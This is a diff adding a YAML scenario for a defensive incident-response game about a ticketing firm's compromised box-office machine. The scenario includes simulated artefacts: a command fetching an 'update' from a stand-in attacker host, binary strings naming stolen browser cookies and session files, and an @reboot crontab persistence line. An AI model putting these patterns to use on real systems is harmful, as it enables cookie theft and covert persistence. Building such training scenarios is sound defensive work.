@@ -1,0 +1,211 @@
+# Side series "Le Presse-papiers". Everything here is fictional: reserved .test and .example
+# domains, private addresses and documentation ranges only. Played from the defence side.
+# The line the fake check copies runs `cm-verif`, the ticket office's own (fictional) tool: no real
+# shell, download or encoding ever appears in a copy block.
+startTime: "2027-12-03T10:15:00+01:00"
+mandate: CM-2027-118
+scope:
+  domains: ["*.contremarque.test"]
+  networks: ["10.116.0.0/24"]
+player:
+  host: kestrel
+  user: kestrel
+resolver: 10.116.0.2
+
+config:
+  pp.isolated: false
+  pp.cleaned: false
+
+hosts:
+  - id: kestrel
+    hostname: lignerouge.test
+    ip: 10.116.0.66
+    kind: player
+    os: LR-OS 4.2
+    map: { x: -320, z: 40, h: 70 }
+    links: [www, guichet02]
+    users:
+      - { name: kestrel, home: /home/kestrel }
+    fs:
+      home:
+        kestrel:
+          README.txt: { $t: file.readme }
+          mandate:
+            CM-2027-118.txt: { $t: file.mandate }
+      etc:
+        hostname: "lignerouge\n"
+
+  # The public site. The concert page carries what a hijacked third-party widget injected.
+  - id: www
+    hostname: www.contremarque.test
+    ip: 10.116.0.10
+    os: Linux 6.1 (Debian 12)
+    map: { x: 60, z: -120, h: 140 }
+    services:
+      - { port: 443, name: https, product: nginx 1.26 }
+    web:
+      "/":
+        page:
+          title: page.home.title
+          blocks:
+            - { h1: page.home.h1 }
+            - { p: page.home.p }
+            - { link: { href: /concerts/nuit-blanche, label: page.home.link } }
+            - { footer: page.footer }
+      "/concerts/nuit-blanche":
+        page:
+          title: page.nb.title
+          blocks:
+            - { h1: page.nb.h1 }
+            - { p: page.nb.p }
+            - { comment: page.nb.comment }
+            - { h2: page.check.h2 }
+            - { p: page.check.p }
+            - copy: { button: page.check.button, text: page.check.text, note: page.check.note }
+            - { footer: page.footer }
+        variants:
+          # Once the widget is gone from the site's configuration, the page is the concert again.
+          - id: fixed
+            if: { file: "~/site/widgets.conf", lacks: "stats-billet.example" }
+            page:
+              title: page.nb.title
+              blocks:
+                - { h1: page.nb.h1 }
+                - { p: page.nb.p }
+                - { p: page.nb.buy }
+                - { footer: page.footer }
+
+  # Box office 2, at the Salle des Tanneurs. Incident response access, read only.
+  - id: guichet02
+    hostname: guichet02.contremarque.test
+    ip: 10.116.0.42
+    os: Linux 6.1 (Debian 12)
+    map: { x: 120, z: 80, h: 110 }
+    links: [www]
+    services:
+      - { port: 22, name: ssh, product: OpenSSH 9.2p1 Debian }
+    users:
+      - { name: ir, home: /home/ir }
+      - { name: ines, home: /home/ines }
+    ssh:
+      - { user: ir, from: [kestrel] }
+    fs:
+      etc:
+        hostname: "guichet02\n"
+        passwd: "root:x:0:0:root:/root:/bin/bash\nines:x:1001:1001:guichet Tanneurs:/home/ines:/bin/bash\nir:x:1002:1002:Ligne Rouge IR (read only):/home/ir:/bin/bash\n"
+      usr:
+        local:
+          bin:
+            cm-verif:
+              $binary:
+                format: elf
+                strings:
+                  - "cm-verif 3.2 (c) Contremarque"
+                  - "usage: cm-verif --check --ticket ID | cm-verif --update [--from HOST]"
+                  - "--from HOST   fetch the update from HOST instead of maj.contremarque.test"
+                  - "--silent      no output"
+                  - "installed update: ~/.cache/syncd-helper"
+      home:
+        ir:
+          README.txt: { $t: file.ir.readme }
+        ines:
+          .bash_history: { $t: file.history }
+          .cache:
+            syncd-helper:
+              $binary:
+                format: elf
+                strings:
+                  - "syncd-helper 0.9"
+                  - "https://maj.contremarque-billet.example/s"
+                  - "collect=~/.config/contremarque/session,~/.mozilla/firefox/*/cookies.sqlite"
+                  - "every=600"
+      var:
+        spool:
+          cron:
+            crontabs:
+              ines: "# m h dom mon dow command\n0 9 * * 1-6 /usr/local/bin/cm-verif --check --ticket ouverture\n@reboot /home/ines/.cache/syncd-helper\n"
+    system:
+      processes:
+        - { pid: 1, ppid: 0, user: root, start: Nov29, cmd: /sbin/init }
+        - { pid: 402, ppid: 1, user: root, start: Nov29, cmd: "/usr/sbin/cron -f" }
+        - { pid: 611, ppid: 1, user: root, start: Nov29, cmd: "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups" }
+        - { pid: 1180, ppid: 1, user: ines, start: "08:55", cpu: 2.1, mem: 6.4, cmd: "/usr/lib/firefox/firefox" }
+        - { pid: 2204, ppid: 1, user: ines, start: Dec01, cpu: 0.1, mem: 0.9, cmd: "/usr/bin/gnome-terminal --window" }
+        - { pid: 2219, ppid: 2204, user: ines, start: Dec01, cpu: 0, mem: 0.2, cmd: "bash" }
+        - { pid: 2231, ppid: 2219, user: ines, start: Dec01, cpu: 0, mem: 0.3, cmd: "/usr/local/bin/cm-verif --silent --from maj.contremarque-billet.example --ticket NB-4471", if: { config: pp.isolated, eq: false } }
+        - { pid: 2240, ppid: 2231, user: ines, start: Dec01, cpu: 0.4, mem: 1.1, cmd: "/home/ines/.cache/syncd-helper", if: { config: pp.isolated, eq: false } }
+      sockets:
+        - { local: "0.0.0.0:22", pid: 611 }
+        - { state: ESTAB, local: "10.116.0.42:50312", peer: "10.116.0.10:443", pid: 1180 }
+        - { state: ESTAB, local: "10.116.0.42:51877", peer: "203.0.113.77:443", pid: 2240, if: { config: pp.isolated, eq: false } }
+      journal:
+        - { at: "Dec 01 14:12:09", unit: cm-verif, pid: 2231, text: "update requested from maj.contremarque-billet.example" }
+        - { at: "Dec 01 14:12:10", unit: cm-verif, pid: 2231, text: "installed update: /home/ines/.cache/syncd-helper" }
+        - { at: "Dec 01 14:12:11", unit: cron, pid: 2238, text: "(ines) REPLACE (ines)" }
+      logins:
+        - { user: ir, from: 10.116.0.66, at: "Fri Dec  3 10:20" }
+        - { user: ines, tty: tty1, from: ":0", at: "Fri Dec  3 08:54" }
+        - { user: ines, tty: tty1, from: ":0", at: "Wed Dec  1 13:58", until: "19:04  (05:06)" }
+
+  # Two other box offices, seen only through the audit logs.
+  - id: guichet05
+    hostname: guichet05.contremarque.test
+    ip: 10.116.0.45
+    os: Linux 6.1 (Debian 12)
+    map: { x: 260, z: 40, h: 100 }
+  - id: guichet07
+    hostname: guichet07.contremarque.test
+    ip: 10.116.0.47
+    os: Linux 6.1 (Debian 12)
+    map: { x: 300, z: 160, h: 100 }
+
+  # The internal resolver.
+  - id: resolveur
+    hostname: ns.contremarque.test
+    ip: 10.116.0.2
+    os: Linux 6.1 (Debian 12)
+    map: { x: -100, z: 180, h: 90 }
+    services:
+      - { port: 53, name: domain, product: Unbound 1.19 }
+
+  # Whoever is behind the fake update server. Never reached: out of the mandate.
+  - id: outside
+    hostname: maj.contremarque-billet.example
+    ip: 10.116.0.250
+    kind: unknown
+    hidden: true
+    os: unknown
+    map: { x: 480, z: 220, h: 40 }
+
+dns:
+  contremarque.test: { A: ["10.116.0.10"] }
+  www.contremarque.test: { A: ["10.116.0.10"] }
+  guichet02.contremarque.test: { A: ["10.116.0.42"] }
+  guichet05.contremarque.test: { A: ["10.116.0.45"] }
+  guichet07.contremarque.test: { A: ["10.116.0.47"] }
+  ns.contremarque.test: { A: ["10.116.0.2"] }
+
+noise:
+  nmap:
+    base: 18
+    flags: { "-sn": -10, "-sV": 10, "-A": 30, "-T4": 18, "-T5": 36, "-p-": 16 }
+  dig: 0
+  curl: 0
+  browse: 0
+  ssh: 0
+
+telemetry:
+  background:
+    # The box offices check tickets all day with the real tool.
+    - { host: guichet05, source: audit, every: 3, offset: 1, fields: { user: lucas, exe: /usr/local/bin/cm-verif, cmd: "cm-verif --check --ticket NB-2210" } }
+    - { host: guichet07, source: audit, every: 4, offset: 2, fields: { user: sarah, exe: /usr/local/bin/cm-verif, cmd: "cm-verif --check --ticket FX-0912" } }
+    - { host: guichet02, source: audit, every: 5, offset: 3, fields: { user: ines, exe: /usr/local/bin/cm-verif, cmd: "cm-verif --check --ticket NB-3318" } }
+    - { host: guichet05, source: audit, every: 9, offset: 4, fields: { user: lucas, exe: /usr/local/bin/cm-verif, cmd: "cm-verif --update" } }
+    - { host: www, source: access, every: 2, offset: 0, fields: { src: 10.116.0.45, method: GET, path: /concerts/nuit-blanche, status: 200, ua: "Mozilla/5.0 (X11; Linux x86_64)" } }
+
+rules:
+  - id: out-of-scope
+    on: { event: OutOfScope }
+    once: false
+    do:
+      - ada.warn: ada.outOfScope
